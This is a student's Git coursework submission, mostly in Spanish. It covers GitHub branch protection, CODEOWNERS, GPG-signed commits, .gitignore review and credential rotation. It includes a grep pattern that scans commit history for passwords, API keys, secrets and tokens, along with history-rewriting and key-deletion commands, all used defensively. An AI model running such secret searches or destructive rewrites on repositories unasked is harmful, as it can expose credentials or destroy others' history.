# Exercise Outcomes Submission Template

**Student/Group Name**: Fernando Cuesta Bueno
**Level Completed**: master-of-the-universe  
**Date**: 14/02/2026

---

## 📋 Exercise Summary

### Exercise: Git - Master of the Universe

**Status**: ✅ Completed

**What I did**:
[Brief description of what you accomplished in this exercise. Since each level has one comprehensive exercise with multiple parts, describe your overall achievement and the key parts you completed.]

**Commands Used**:

```bash
$ history
 1209  git checkout main
 1210  git pull origin main
 1211  echo "test" > direct-push.txt
 1212  git add direct-push.txt
 1213  git commit -m "Attempting direct push"
 1214  git push origin main  # This should fail if protections are active!
 1215  git checkout master-of-the-universe
 1216  git checkout -b feature/protected-workflow
 1217  echo "Proper workflow following branch protection" > workflow.txt
 1218  git add workflow.txt
 1219  git commit -S -m "feat: Add workflow documentation"
 1220  git push origin feature/protected-workflow
 1221  echo "Signed commit test 1" > signed-1.txt
 1222  git add signed-1.txt
 1223  git commit -S -m "feat: Add first signed commit"
 1224  echo "Signed commit test 2" > signed-2.txt
 1225  git add signed-2.txt
 1226  git commit -S -m "feat: Add second signed commit"
 1227  git log --show-signature -2
 1228  # Check for sensitive patterns in commit history
 1229  git log -p | grep -i "password\|api_key\|secret\|token" | head -20
 1230  # Check for large files that might contain sensitive data
 1231  git rev-list --objects --all |   git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' |   sed -n 's/^blob //p' |   sort --numeric-sort --key=2 |   tail -n 10
 1232  git checkout master-of-the-universe
 1233  git checkout -b group-X-outcomes/master-of-the-universe
 1234  git checkout main -- OUTCOME_TEMPLATE.md
 1235  cp OUTCOME_TEMPLATE.md OUTCOMES.md
 1236  history
```

## Parte 1

### Branch Protection Configuration Screenshots

Screenshots de la configuración de protección de ramas en GitHub para la rama `main`:

![GitHub Branch Protection Rules Overview](images/github-branch-protection-rules-overview-1.png)
![GitHub Branch Protection Detailed Settings](images/github-branch-protection-rules-overview-2.png)

### Explicación de cada una de las reglas de protección y su propósito:

#### Rule 1: Pull Request Reviews

**Purpose**: Garantizar que todo código sea revisado por al menos otro desarrollador antes de ser integrado en la rama principal, mejorando la calidad del código y previniendo bugs.

**Implementation**:

- Se requiere un Pull Request antes de mergear
- Se requiere al menos 1 aprobación de otro revisor
- Se descartan automáticamente las aprobaciones antiguas cuando se hacen nuevos commits
- Se requiere revisión de los Code Owners (conforme al archivo CODEOWNERS)
- Se requiere resolución de conversaciones antes de mergear

**Impact on Workflow**: Ralentiza el proceso de merge pero incrementa significativamente la calidad del código, la documentación de cambios y el conocimiento compartido del equipo.

#### Rule 2: Signed Commits

**Purpose**: Verificar la autenticidad e integridad de los commits garantizando que provienen de desarrolladores autorizados, proporcionando trazabilidad criptográfica y prevención de suplantación de identidad.

**Implementation**:

- Se requiere que todos los commits sean firmados con GPG
- Los commits deben tener un badge "Verified" en GitHub
- La clave GPG privada debe estar configurada localmente en cada máquina de desarrollo
- La clave GPG pública debe estar agregada a la cuenta de GitHub del desarrollador

**Impact on Workflow**: Añade un paso adicional al hacer commits (firma GPG), pero proporciona garantía criptográfica de autoría y previene commits no autorizados.

#### Rule 3: Status Checks

**Purpose**: Automatizar la validación de calidad mediante la ejecución de pruebas, análisis de código y otras verificaciones antes de permitir el merge, asegurando que el código cumple con estándares mínimos.

**Implementation**:

- Se requiere que todas las verificaciones de estado pasen antes de mergear
- Se requiere que las ramas estén actualizadas con la rama base antes de mergear
- Típicamente incluye: pruebas unitarias, linting, análisis estático, coverage mínimo
- Las reglas se aplican también a administradores del repositorio

**Impact on Workflow**: Previene la integración de código problemático y mantiene la estabilidad de la rama principal, aunque puede ralentizar el desarrollo si las verificaciones son lentas.

### Revisión del Archivo CODEOWNERS

**Ubicación del Archivo**: `/CODEOWNERS`

**Propósito**: Definir la propiedad del código y asignaciones automáticas de solicitudes de revisión en el repositorio, asegurando que los propietarios designados revisen los cambios en sus áreas de responsabilidad.

**Cómo Funciona**:

- Cada línea contiene un patrón de archivo seguido de uno o más propietarios
- Cuando una Pull Request modifica archivos que tienen propietarios asignados, esos propietarios son automáticamente solicitados para revisar
- Si la protección de rama requiere revisiones de propietarios de código, la PR no puede ser fusionada sin su aprobación

**Análisis de la Configuración Actual**:

| Patrón                    | Propietario(s) | Propósito                                  |
| ------------------------- | -------------- | ------------------------------------------ |
| `/CODEOWNERS`             | @miguel-oltra  | Propiedad del archivo de configuración     |
| `/MODEL_SPEC.MD`          | @miguel-oltra  | Especificación del modelo de entrenamiento |
| `/EVALUATION_CRITERIA.md` | @miguel-oltra  | Documento de criterios de evaluación       |
| `/INSTRUCTOR_GUIDE.md`    | @miguel-oltra  | Documentación del instructor               |
| `/SUMMARY.md`             | @miguel-oltra  | Resumen del repositorio                    |
| `[main]` `*`              | @miguel-oltra  | Todos los archivos en la rama principal    |

**Puntos Clave de Aprendizaje**:

1. **Protección de Ramas de Ejercicio**: El archivo CODEOWNERS protege las ramas de ejercicio, no el trabajo de los aprendices. Los aprendices trabajan en forks o ramas de resultados sin restricciones.

2. **Momento de Descubrimiento**: Los aprendices que implementan estrategias de ramificación descubrirán los requisitos de propiedad de código al intentar enviar PRs a ramas protegidas, aprendiendo de forma natural flujos de trabajo de colaboración en el mundo real.

3. **Limitación del Alcance**: La propiedad del código SOLO se aplica al enviar PRs a ramas de ejercicio protegidas. Los aprendices pueden hacer push libremente a:
   - Sus propios forks
   - Ramas de resultados (group-X-outcomes/\*)
   - Ramas de características en su flujo de trabajo

4. **Rol de Miguel Oltra**: Como @miguel-oltra, el propietario del repositorio mantiene control sobre el contenido del ejercicio y la documentación, asegurando la integridad del material de entrenamiento.

**Impacto Profesional**:

- Previene modificaciones accidentales al contenido del ejercicio
- Crea una experiencia de aprendizaje auténtica cuando los aprendices descubren la propiedad del código
- Asegura que solo cambios autorizados lleguen a los materiales de enseñanza principales
- Enseña prácticas de desarrollo colaborativo con revisiones obligatorias

### Balance entre Seguridad y Flujo de Trabajo

**Análisis de Compensaciones**:

El objetivo es encontrar un equilibrio óptimo entre protecciones de seguridad y velocidad de desarrollo. Las medidas de seguridad deben prevenir errores y accesos no autorizados sin obstaculizar excesivamente la productividad del equipo.

**Medidas de Seguridad Implementadas**:

1. **Pull Request Reviews**: Requiere revisión antes del merge, pero puede ralentizar cambios urgentes
2. **Signed Commits**: Garantiza autenticidad, añade overhead mínimo si se configura automatización
3. **Status Checks**: Previene código defectuoso, requiere CI/CD robusto

**Estrategia de Mitigación de Impacto**:

- **Automatización**: Configurar firmas GPG automáticas en la terminal para reducir fricción
- **CI/CD Optimizado**: Mantener las verificaciones rápidas y paralelas
- **Excepciones Documentadas**: Permitir bypass en casos de emergencia con auditoría completa
- **Educación del Equipo**: Capacitar en las herramientas para que se usen eficientemente

**Recomendaciones de Implementación**:

- Comenzar con protecciones básicas y escalar según sea necesario
- Monitorear métricas de tiempo de merge y ajustar reglas
- Revisar periódicamente la efectividad de las protecciones
- Mantener documentación clara de las políticas

---

## Parte 2

### Evidence of blocked direct push attempt

```bash
fernando@fernando-lggram:~/master/desarrollo-del-software/taller-master-ugr$ git checkout main
$ git pull origin main
$ echo "test" > direct-push.txt
$ git add direct-push.txt
$ git commit -m "Attempting direct push"
$ git push origin main  # This should fail if protections are active!
Already on 'main'
Your branch is up to date with 'origin/main'.
From github.com:FerniCuesta/taller-master-ugr
 * branch            main       -> FETCH_HEAD
Already up to date.
[main bf0071d] Attempting direct push
 1 file changed, 1 insertion(+)
 create mode 100644 direct-push.txt
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 16 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 290 bytes | 290.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: Resolving deltas: 100% (1/1), completed with 1 local object.
remote: error: GH013: Repository rule violations found for refs/heads/main.
remote: Review all repository rules at https://github.com/FerniCuesta/taller-master-ugr/rules?ref=refs%2Fheads%2Fmain
remote:
remote: - Changes must be made through a pull request.
remote:
remote: - Required status check "pull" is expected.
remote:
remote: - Commits must have verified signatures.
remote:   Found 1 violation:
remote:
remote:   bf0071d7ae3700ce47045443e30da70b424c555b
remote:
To github.com:FerniCuesta/taller-master-ugr.git
 ! [remote rejected] main -> main (push declined due to repository rule violations)
error: failed to push some refs to 'github.com:FerniCuesta/taller-master-ugr.git'
```

Screenshot del error de push:

![Git Push Rejected - Repository Rule Violations](images/git-push-rejected-branch-protection.png)

### Feature branch and PR creation workflow

```bash
$ git checkout master-of-the-universe
$ git checkout -b feature/protected-workflow
$ echo "Proper workflow following branch protection" > workflow.txt
$ git add workflow.txt
$ git commit -S -m "feat: Add workflow documentation"
$ git push origin feature/protected-workflow
Switched to branch 'master-of-the-universe'
Your branch is up to date with 'origin/master-of-the-universe'.
Switched to a new branch 'feature/protected-workflow'
[feature/protected-workflow a2dcaa9] feat: Add workflow documentation
 1 file changed, 1 insertion(+)
 create mode 100644 workflow.txt
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 16 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 557 bytes | 557.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote:
remote: Create a pull request for 'feature/protected-workflow' on GitHub by visiting:
remote:      https://github.com/FerniCuesta/taller-master-ugr/pull/new/feature/protected-workflow
remote:
To github.com:FerniCuesta/taller-master-ugr.git
 * [new branch]      feature/protected-workflow -> feature/protected-workflow
```

### GitHub PR interface showing active protections

![Screenshot: GitHub PR with branch protection requirements](images/github-pr-branch-protection-active.png)

### Comprensión de los Requisitos de Aprobación

#### Descripción General de Requisitos de Aprobación

**Configuración de Aprobaciones Requeridas**:

- **Aprobaciones Mínimas**: Se requiere 1 aprobación del Propietario del Código (@miguel-oltra)
- **Descartar Revisiones Antiguas**: Habilitado - Las aprobaciones antiguas se descartan cuando se hacen nuevos commits
- **Requerir Revisión del Propietario del Código**: Habilitado - Debe ser aprobado por el propietario definido en el archivo CODEOWNERS
- **Resolver Conversaciones**: Requerido - Todos los comentarios y sugerencias deben resolverse antes del merge

#### Cómo Funciona el Flujo de Aprobación

1. **Creación del Pull Request**: Cuando se crea un PR contra una rama protegida (main, master-of-the-universe), las reglas de protección de rama se aplican automáticamente

2. **Verificaciones de Estado**: Las siguientes verificaciones de estado deben pasar:
   - Verificación de estado "pull" (verificación de canalización CI/CD)
   - Todas las verificaciones de estado requeridas deben estar en verde antes de la aprobación

3. **Asignación del Propietario del Código**:
   - GitHub solicita automáticamente la revisión de @miguel-oltra basándose en patrones de CODEOWNERS
   - Para archivos que coincidan con patrones en CODEOWNERS, el propietario designado DEBE aprobar

4. **Proceso de Aprobación**:
   - El revisor revisa los cambios de código, pruebas y documentación
   - El revisor puede aprobar, solicitar cambios o comentar
   - Si se solicitan cambios, el autor debe abordarlos e impulsar nuevos commits
   - Las revisiones antiguas se descartan automáticamente en nuevos commits (fuerza re-revisión)
   - Todas las conversaciones de las revisiones deben marcarse como resueltas

5. **Elegibilidad para Merge**:
   - Todas las verificaciones de estado requeridas pasadas ✓
   - Al menos 1 aprobación recibida ✓
   - Todas las conversaciones resueltas ✓
   - Rama actualizada con la rama base ✓
   - Todas las firmas de commits verificadas ✓

---

## Parte 3

### GPG key successfully configured and added to GitHub

Pasos de configuración:

```bash

```

Captura de pantalla de la configuración de la clave GPG en GitHub:

### Signed commits showing "Verified" badge on GitHub

Captura de pantalla de los commits firmados con el badge "Verified":

![Git Signed Commits - Verified Badge](images/signed-commits-verified-badge-1.png)

Hash y descripción de los commits firmados:

- `17f44ed69a2f6f6dd6f10710618089b71dc17836` - images: añade imágenes de documentación
- `e24bdb2def5d00b1301e4ed44553dfad68bbc287` - feat: Add first signed commit
- `a05e174f483f03013e40f194f1cada39db31a8f5` - docs: documenta hasta la parte 2 incluida

Captura de pantalla de los commits firmados con el badge "Verified":

![Git Signed Commits - Verified Badge](images/signed-commits-verified-badge-2.png)

Hash y descripción de los commits firmados:

- `a2dcaa9609ec9d23c9c496f732d43724c2034dcd` - feat: Add workflow documentation
- `c93ca7a977d8cb7a9c3d8ad92cbb8a4b5d878af2` - feat: Add first signed commit
- `ceb6111182d0403b770adc83486acc1ff239860f` - docs: documenta hasta la parte 2 incluida

### git log --show-signature output

```bash
$ git log --show-signature
commit ceb6111182d0403b770adc83486acc1ff239860f (HEAD -> feature/protected-workflow, origin/feature/protected-workflow)
gpg: Signature made Sat 14 Feb 2026 09:23:29 PM WET
gpg:                using RSA key 23D9F3027B8414036743E594601A8AFCCA65E576
gpg: Good signature from "Fernando Cuesta Bueno <fernandocuestab@gmail.com>" [ultimate]
Author: Fernando Cuesta <fernandocuestab@gmail.com>
Date:   Sat Feb 14 21:23:29 2026 +0000

    feat: Add second signed commit

commit c93ca7a977d8cb7a9c3d8ad92cbb8a4b5d878af2
gpg: Signature made Sat 14 Feb 2026 09:23:21 PM WET
gpg:                using RSA key 23D9F3027B8414036743E594601A8AFCCA65E576
gpg: Good signature from "Fernando Cuesta Bueno <fernandocuestab@gmail.com>" [ultimate]
Author: Fernando Cuesta <fernandocuestab@gmail.com>
Date:   Sat Feb 14 21:23:21 2026 +0000

    feat: Add first signed commit

commit a2dcaa9609ec9d23c9c496f732d43724c2034dcd
gpg: Signature made Sat 14 Feb 2026 09:03:00 PM WET
gpg:                using EDDSA key CE054328F5C4BCBE750A919FB1CC3B208A891135
gpg:                issuer "fernandocuestab@gmail.com"
gpg: Good signature from "Fernando Cuesta <fernandocuestab@gmail.com>" [ultimate]
Author: Fernando Cuesta <fernandocuestab@gmail.com>
Date:   Sat Feb 14 21:03:00 2026 +0000

    feat: Add workflow documentation
```

#### Automatic signing configured in Git

**Paso 1: Generar Clave GPG**

```bash
$ gpg --full-generate-key
# Selección: RSA and RSA (opción 1)
# Tamaño de clave: 4096 bits
# Expiración: 0 (sin expiración)
# Nombre real: Fernando Cuesta Bueno
# Correo: fernandocuestab@gmail.com
```

**Paso 2: Listar Claves Secretas e Identificar el ID de Clave**

```bash
$ gpg --list-secret-keys --keyid-format=long
# El resultado muestra: sec   rsa4096/601A8AFCCA65E576
# Huella de clave: 23D9F3027B8414036743E594601A8AFCCA65E576
```

**Paso 3: Configurar Git para Usar la Clave GPG para Firmar**

```bash
$ git config --global user.signingkey 601A8AFCCA65E576
$ git config --global commit.gpgsign true
$ git config --global tag.gpgSign true
```

**Paso 4: Exportar Clave Pública a GitHub**

```bash
$ gpg --armor --export 23D9F3027B8414036743E594601A8AFCCA65E576
# Copiar el BLOQUE DE CLAVE PÚBLICA PGP
# Agregarlo a GitHub Settings > SSH and GPG keys > New GPG key
```

---

## Parte 4

### .gitignore Review

![Screenshot: .gitignore configuration](images/gitignore-configuration.png)

**Contenido Analizado del .gitignore**:

```
# Ensure .gitignore includes common sensitive patterns:
# .env files
.env
.env.local
.env.*.local

# API keys
*.key
*.pem

# Credentials
.credentials
.aws/credentials

# Private keys (.key, .pem files)
*.key
*.pem
id_rsa*

# OS and IDE
.DS_Store
.vscode/
.idea/
*.swp
*.swo
*~

# Dependencies
node_modules/
venv/
__pycache__/

# Build outputs
dist/
build/
*.egg-info/
```

**Análisis de Patrones de Seguridad**:

| Categoría             | Patrón                                                    | Protege                                                        | Evaluación    |
| --------------------- | --------------------------------------------------------- | -------------------------------------------------------------- | ------------- |
| Variables de Entorno  | `.env`, `.env.local`, `.env.*.local`                      | Credenciales almacenadas en archivos de configuración local    | ✅ Crítico    |
| Claves Criptográficas | `*.key`, `*.pem`, `id_rsa*`                               | Claves privadas SSH, certificados SSL, claves de encriptación  | ✅ Crítico    |
| Credenciales          | `.credentials`, `.aws/credentials`                        | Archivos de credenciales de AWS y otras plataformas            | ✅ Crítico    |
| Archivos del SO       | `.DS_Store`, `.vscode/`, `.idea/`, `*.swp`, `*.swo`, `*~` | Archivos de sistema operativo e IDE que no deben versionarse   | ✅ Importante |
| Dependencias          | `node_modules/`, `venv/`, `__pycache__/`                  | Carpetas de librerías descargadas que aumentan tamaño del repo | ✅ Importante |
| Artefactos de Build   | `dist/`, `build/`, `*.egg-info/`                          | Salidas compiladas y empaquetadas que se regeneran             | ✅ Importante |

### Sensitive Pattern Scan

**Command Used**:

```bash
# Check for sensitive patterns in commit history
$ git log -p | grep -i "password\|api_key\|secret\|token" | head -20

# Check for large files that might contain sensitive data
$ git rev-list --objects --all | \
  git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | \
  sed -n 's/^blob //p' | \
  sort --numeric-sort --key=2 | \
  tail -n 10
-   config/secrets.yml
-2. **Detection** - Use git-secrets or similar tools:
+2. **Detection** - Scan for potential secrets in repository history:
-   # Install git-secrets
-   git secrets --install
-   git secrets --register-aws
-3. **Remediation** - Remove accidentally committed secrets:
+   git log -p | grep -i "password\|api_key\|secret\|token" | head -20
-   git filter-repo --path config/secrets.yml --invert-paths
-   bfg --delete-files secrets.yml
-   * Use environment variables for secrets
-   * Use secret management tools (HashiCorp Vault, AWS Secrets Manager)
-   * Use GitHub Secrets for CI/CD
-   * Enable secret scanning on GitHub
-   git log -p | grep -i "password\|api_key\|secret"
-   * Enable: Secret scanning
+     - Secret scanning (if available)
+   * Best practices for secret management (environment variables, secret vaults)
-     - Demonstration of secret detection (if using tools)
-     - Pattern search for potential secrets
855509858c3dec24ec0df7d963f987d30d803274 15846 OUTCOMES.md
4665687ce1ab7ed53dfcb24b03296e43f2111e33 16857 OUTCOMES.md
eec8d4b01f48d91b934f412aee7ac24bc5ceb947 16969 OUTCOMES.md
60dbe67d5c391905a7e9f3e8eb3d1113cc12e1df 16982 README.md
9a3cdfb7169cb0db27841d5750c78de7703ce443 16982 README.md
c1f120fdedaf8572c830d012662346ab90f98c69 20234 OUTCOMES.md
e182676650e5f4a7247df3ba8d86055c49ae69e7 25924 images/git_status.png
8e2d3e6c7e6edbc3acf3b0b83a66208d6616e185 100681 images/screenshot-2.png
75b1032732a9944134c0520938496f1303f4120e 101055 images/screenshot-1.png
6d61163859d07364b5320b1325790260c577239e 112514 images/GitHub_branches.png
```

### Understanding of data remediation approaches

**¿Qué es la Remediación de Datos?**

La remediación de datos es el proceso de identificar, aislar y eliminar o gestionar información sensible que fue accidentalmente comprometida o expuesta en el repositorio Git. Es una actividad crítica cuando se descubre que secretos, credenciales o datos personales han sido commiteados al historial de Git.

**Enfoques de Remediación Disponibles**:

#### 1. **BFG Repo-Cleaner**

**Descripción**: Herramienta especializada en limpiar el historial de Git de forma rápida y segura.

**Ventajas**:

- Muy rápido, especialmente en repositorios grandes
- Interfaz simple y segura
- Mantiene integridad de commits válidos
- Excelente para eliminar archivos sensibles completos

**Limitaciones**:

- No permite búsquedas complejas con regex
- Requiere reescritura de historial (git push --force)
- Puede ser problemático en repositorios colaborativos

**Caso de Uso**: Eliminar accidentalmente un archivo `config/secrets.yml` del historial completo

**Comando Ejemplo**:

```bash
$ bfg --delete-files secrets.yml
$ git reflog expire --expire=now --all && git gc --prune=now --aggressive
$ git push origin --force-with-lease
```

#### 2. **Git Filter-Repo**

**Descripción**: Herramienta oficial de Git para reescribir historial con control granular.

**Ventajas**:

- Muy flexible y controlable
- Soporta filtros complejos y personalizados
- Mejor para búsquedas por patrón
- Ideal para remediación selectiva

**Limitaciones**:

- Requiere más conocimiento técnico
- Más lento en repositorios muy grandes
- Reescritura completa del historial

**Caso de Uso**: Eliminar líneas con "password=" o "API_KEY=" de archivos específicos

**Comando Ejemplo**:

```bash
$ git filter-repo --path config/ --invert-paths  # Elimina carpeta config
$ git filter-repo --path-glob '*.env' --invert-paths  # Elimina archivos .env
$ git push origin --force-with-lease
```

#### 3. **GitHub Secret Scanning API**

**Descripción**: Servicio nativo de GitHub que detecta automáticamente patrones de secretos.

**Ventajas**:

- Detección automática sin intervención manual
- Alerta inmediata a desarrolladores
- Integración nativa con GitHub
- Notificaciones de proveedores de terceros

**Limitaciones**:

- Solo detecta patrones conocidos
- No elimina el secreto del historio (solo alerta)
- Requiere intervención manual para remediación

**Caso de Uso**: Detección automática cuando se commitea una clave AWS accidentalmente

#### 4. **Rotación y Revocación Manual**

**Descripción**: Cambiar las credenciales comprometidas en los sistemas originales.

**Ventajas**:

- Rápida implementación
- No requiere reescritura de Git
- Efectiva contra acceso real comprometido
- Funciona para secretos ya públicos

**Limitaciones**:

- No elimina el secreto del historial de Git
- Histórico permanece expuesto
- No es completa si el secreto está en el historio público

**Caso de Uso**: Token de GitHub expuesto - regenerar token inmediatamente

**Proceso**:

```bash
# 1. Identificar el secreto expuesto
git log -p | grep -i "token\|password\|api_key"

# 2. Revocar el secreto en el sistema original
# GitHub Settings > Developer Settings > Personal Access Tokens > Delete

# 3. Regenerar nuevo secreto
# GitHub Settings > Developer Settings > Personal Access Tokens > Generate new token

# 4. Actualizar referencias locales y sistemas
git config --global --unset user.password  # Si aplica
# Actualizar .env, variables de entorno, etc.

# 5. Reescribir commit si es necesario
git filter-repo --replace-text <(echo "old-token==>new-token=")
```

#### 5. **Estrategia de Prevención + Remediación Combinada**

**Enfoque Integral**:

1. **Prevención**: Implementar `.gitignore` y pre-commit hooks
2. **Detección**: Usar secret scanning en CI/CD
3. **Remediación**: Si ocurre, actuar rápido con BFG o filter-repo
4. **Rotación**: Cambiar credenciales comprometidas inmediatamente
5. **Auditoría**: Revisar logs de acceso con credenciales comprometidas

**Decisión sobre Enfoque por Severidad**:

| Severidad | Secreto           | Acción Inmediata  | Remediación Git  | Rotación   |
| --------- | ----------------- | ----------------- | ---------------- | ---------- |
| Crítica   | AWS keys          | 🔴 Revocar YA     | Sí (BFG)         | Regenerar  |
| Alta      | GitHub token      | 🔴 Revocar YA     | Sí (BFG)         | Regenerar  |
| Media     | API key privada   | 🟡 Revocar pronto | Sí (filter-repo) | Regenerar  |
| Baja      | Documento interno | 🟢 Limpiar        | Considerar       | No urgente |

---

### Documentation of credential rotation best practices

**Concepto**: Cambiar periódicamente o inmediatamente credenciales (contraseñas, tokens, claves) para minimizar riesgo de exposición. Es una práctica de seguridad fundamental que limita el tiempo que un atacante puede usar credenciales comprometidas.

#### Mejores Prácticas de Rotación de Credenciales

##### 1. **Política de Rotación Programada**

**Recomendación**: Establecer ciclos regulares de rotación según severidad

**Implementación**:

```
Tablas de Rotación por Tipo de Credencial:

| Tipo de Credencial        | Ciclo Recomendado | Crítica? |
|---------------------------|-------------------|----------|
| Contraseña de admin       | 30 días           | Sí       |
| Contraseña de usuario     | 90 días           | Sí       |
| API tokens                | 60 días           | Sí       |
| SSH keys                  | 180 días          | Sí       |
| Certificados SSL/TLS      | 365 días          | Sí       |
| Contraseña of BD          | 30 días           | Sí       |
| Tokens GitHub             | 90 días           | Sí       |
| AWS access keys           | 90 días           | Sí       |
| GCP service account keys  | 180 días          | Sí       |
```

**Calendario de Ejemplo**:

```bash
# 1. Documentar rotación esperada
echo "GitHub Tokens - Last Rotate: $(date)" >> SECURITY_LOG.md

# 2. Automatizar reminders
# Configurar reminder en calendario/sistema para el próximo ciclo
# Env: export NEXT_ROTATION=$(date -d "+90 days" +%Y-%m-%d)
```

##### 2. **Rotación de Tokens GitHub**

**Paso a Paso**:

```bash
# 1. Generar nuevo token en GitHub
# GitHub -> Settings -> Developer settings -> Personal access tokens -> Generate new token
# Seleccionar scopes necesarios (nunca dar permisos innecesarios)
# Copiar token inmediatamente

# 2. Actualizar en máquina local
git config --global github.token "ghp_NUEVO_TOKEN_AQUI"
# O si usas SSH, actualizar SSH key
git config --global core.sshCommand "ssh -i ~/.ssh/github_new_key"

# 3. Actualizar en variables de entorno
export GITHUB_TOKEN="ghp_NUEVO_TOKEN_AQUI"
echo 'export GITHUB_TOKEN="ghp_NUEVO_TOKEN_AQUI"' >> ~/.bashrc

# 4. Actualizar en sistemas CI/CD
# GitHub Actions -> Settings -> Secrets and variables -> Actions -> Update secret

# 5. Verificar e probar acceso
git clone https://github.com/usuario/repo.git  # Debe funcionar sin errores
gh auth refresh --scopes repo,admin:repo_hook    # Verificar permisos

# 6. Revocar token antiguo
# GitHub -> Settings -> Developer settings -> Personal access tokens -> Delete
```

**Seguridad**:

- Nunca commitear tokens en código
- Usar `.gitignore` para archivos con tokens
- Usar variables de entorno en lugar de valores literales
- Revocar tokens viejos inmediatamente después de activar los nuevos

##### 3. **Rotación de SSH Keys**

**Proceso de Rotación Segura**:

```bash
# 1. Generar nueva clave SSH en máquina local
ssh-keygen -t ed25519 -C "fernandocuestab@gmail.com" -f ~/.ssh/github_new
# o RSA para compatibilidad: ssh-keygen -t rsa -b 4096

# 2. Agregar nueva clave pública a GitHub
cat ~/.ssh/github_new.pub
# GitHub -> Settings -> SSH and GPG keys -> New SSH key
# Pegar contenido, nombre descriptivo: "Personal-Laptop-2026"

# 3. Actualizar configuración SSH local
# Editar ~/.ssh/config
Host github.com
  HostName github.com
  User git
  IdentityFile ~/.ssh/github_new
  IdentitiesOnly yes

# 4. Probar conexión
ssh -T git@github.com
# Output: "Hi username! You've successfully authenticated, but GitHub does not provide shell access."

# 5. Eliminar clave antigua de GitHub
# GitHub -> Settings -> SSH and GPG keys -> Delete key "Personal-Laptop-Old"

# 6. Opcionalmente eliminar clave privada antigua local (después de confirmar todo funciona)
rm ~/.ssh/github_old
rm ~/.ssh/github_old.pub
```

**Mejores Prácticas SSH**:

- Usar Ed25519 por defecto (más seguro que RSA)
- Diferentes claves para diferentes propósitos/máquinas
- Nombre descriptivo: "empresa-laptop-2026"
- Revisar qué claves tienen acceso cada 90 días

##### 4. **Rotación de GPG Keys**

**Cuándo Rotar**:

- Sospecha de compromiso
- Cada 2 años como máximo
- Cambio de máquina principal

**Proceso**:

```bash
# 1. Generar nueva clave GPG
gpg --full-generate-key
# Seleccionar: (1) RSA and RSA
# Tamaño: 4096
# Expiración: 2y (2 años)

# 2. Listar nueva clave
gpg --list-secret-keys --keyid-format=long
# Copiar: sec   rsa4096/NEW_KEY_ID_HERE

# 3. Exportar clave pública
gpg --armor --export NEW_KEY_ID_HERE > new_gpg_key.asc

# 4. Agregar a GitHub
# GitHub -> Settings -> SSH and GPG keys -> GPG keys -> New GPG key
# Pegar contenido de new_gpg_key.asc

# 5. Configurar Git para usar nueva clave
git config --global user.signingkey NEW_KEY_ID_HERE

# 6. Prueba: hacer commit firmado
echo "test" > test.txt
git add test.txt
git commit -S -m "test: GPG key rotation"
git log --show-signature -1  # Verificar que está firmado correctamente

# 7. Mantener clave antigua durante transición (verificar commits antiguos)
# GitHub muestra ambas claves durante periodo de transición

# 8. Después de transición completa, eliminar clave antigua
# GitHub -> Settings -> SSH and GPG keys -> Delete GPG key
gpg --delete-secret-key OLD_KEY_ID  # Local opcional
```

##### 5. **Rotación de Base de Datos y Credenciales de Servicio**

**AWS Access Keys Rotation**:

```bash
# 1. Crear nueva access key en AWS Console
# AWS Console -> IAM -> Users -> [User] -> Security credentials -> Create access key

# 2. Copiar Access Key ID y Secret Access Key

# 3. Actualizar localmente
aws configure  # O editar ~/.aws/credentials
# [default]
# aws_access_key_id = NOUVEAUS_KEY_ID
# aws_secret_access_key = NEW_SECRET_KEY

# 4. Probar nueva clave
aws sts get-caller-identity

# 5. Actualizar en CI/CD
# GitHub Actions -> Settings -> Secrets -> Update AWS_ACCESS_KEY_ID y AWS_SECRET_ACCESS_KEY

# 6. Probar en pipeline
# Hacer un commit y verificar que las acciones de AWS funcionan

# 7. Desactivar clave antigua en AWS
# AWS Console -> IAM -> Users -> [User] -> Security credentials -> Deactivate
# Esperar 24h antes de eliminar completamente

# 8. Eliminar clave antigua
# AWS Console -> IAM -> Users -> [User] -> Security credentials -> Delete
```

**Database Credentials**:

```bash
# 1. Cambiar contraseña en base de datos
ALTER USER 'username'@'localhost' IDENTIFIED BY 'NewStrongPassword123!';
FLUSH PRIVILEGES;

# 2. Actualizar referencias en aplicación
# .env files
DATABASE_PASSWORD="NewStrongPassword123!"

# 3. Actualizar en CI/CD secrets
# GitHub Actions -> Secrets -> DB_PASSWORD

# 4. Probar conexión
mysql -u username -p -h localhost  # Usar nueva contraseña

# 5. Auditar acceso anterior (si es necesario)
# Revisar logs de BD para actividad sospechosa con clave antigua
```

##### 6. **Automatización de Rotación**

**GitHub Actions Workflow para Recordatorio**:

```yaml
name: Credential Rotation Reminder
on:
  schedule:
    - cron: "0 9 1 * *" # Primer día de cada mes a las 9 AM

jobs:
  send-reminder:
    runs-on: ubuntu-latest
    steps:
      - name: Create reminder issue
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: '🔐 Monthly Credential Rotation Check',
              body: `## Credential Rotation Checklist\n
              - [ ] GitHub Personal Access Tokens (90 days)\n
              - [ ] SSH Keys (180 days)\n
              - [ ] GPG Keys (if needed)\n
              - [ ] AWS Access Keys (90 days)\n
              - [ ] Database Passwords (60 days)\n
              \n**Last check**: ${new Date().toISOString().split('T')[0]}\n
              Please verify and rotate as needed.`
            })
```

##### 7. **Logging y Auditoría de Rotación**

**Mantener Registro de Rotaciones**:

```bash
# Crear log de rotaciones
cat > CREDENTIAL_ROTATION_LOG.md << 'EOF'
# Credential Rotation Log

## 2026-02-14
- **GitHub Token**: Rotated from `ghp_old...` to `ghp_new...`
  - Reason: Scheduled 90-day rotation
  - Verified: ✓ All CI/CD working
  - Revoked old token: ✓

## 2026-01-15
- **SSH Key**: Generated new Ed25519 key for personal laptop
  - Old: ssh-rsa AAAA... (from 2024)
  - New: ssh-ed25519 AAAB...
  - Tests passed: ✓
  - Old key revoked: ✓

## 2025-12-20
- **AWS Access Keys**: Rotated for security audit
  - Created new key, tested in dev first
  - Updated GitHub Actions secrets
  - Deactivated (not deleted) old key for 24h grace period
EOF

# Adicionar a .gitignore (no commitear secretos!)
